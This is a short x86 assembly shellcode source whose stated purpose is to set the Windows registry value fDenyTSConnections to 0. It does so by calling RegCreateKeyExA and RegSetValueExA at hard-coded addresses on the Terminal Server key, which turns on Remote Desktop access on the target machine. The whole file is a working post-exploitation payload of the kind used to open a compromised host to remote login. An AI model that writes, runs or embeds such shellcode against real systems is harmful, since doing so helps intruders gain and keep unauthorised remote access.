; Purpose: 
;  Set fDenyTSConnections to False 

[BITS 32]
 
global _start
 
_start:
 
;for the handle
xor edx, edx
mov edi, esp
mov dword [edi], edx
sub esp, 0x10       ;avoid handle being overwritten
 
;Prepare the key
; SYSTEM\CurrentControlSet\Control\Terminal Server
push edx
push 0x72657672
push 0x6553206c
push 0x616e696d
push 0x7265545c
push 0x6c6f7274
push 0x6e6f435c
push 0x7465536c
push 0x6f72746e
push 0x6f43746e
push 0x65727275
push 0x435c4d45
push 0x54535953
mov edx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
; https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyA.html 
xor eax, eax
push eax              ; pDisposion = NULL
push edi              ; pHandle
push eax              ; pSecurity = NULL
push 0x0f003f         ; Access = KEY_ALL_ACCESS
push eax              ; Options = REG_OPTION_NON_VOLATILE
push eax              ; Class = NULL
push eax              ; Reserved = NULL
push edx              ; Subkey
push 0x80000002       ; hkey = HKEY_LOCAL_MACHINE
mov eax, 0x77dde9e4   ; RegCreateKeyExA
call eax
 
;RegSetValue ValueName = fDenyTSConnections
push 0x0000736e
push 0x6f697463
push 0x656e6e6f
push 0x43535479
push 0x6e654466
mov edx, esp
 
;REgSEtValue buffer = 0
xor ecx, ecx
push ecx
mov ecx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
; https://www.pinvoke.net/default.aspx/advapi32.reggetvalue
xor eax, eax
push 0x4            ; cbData - size of DWORD
push ecx	    ; lpData - pointer to data (0)
push 0x4            ; dwType - REG_DWORD
push eax            ; Reserved - must by Null
push edx            ; lpValueName 
push dword [edi]    ; hKey
mov eax, 0x77ddead7 ; RegSetValueExA
call eax

push dword [edi]     ;hKey
mov eax,  0x77dd6c17 ;RegCloseKey
call eax
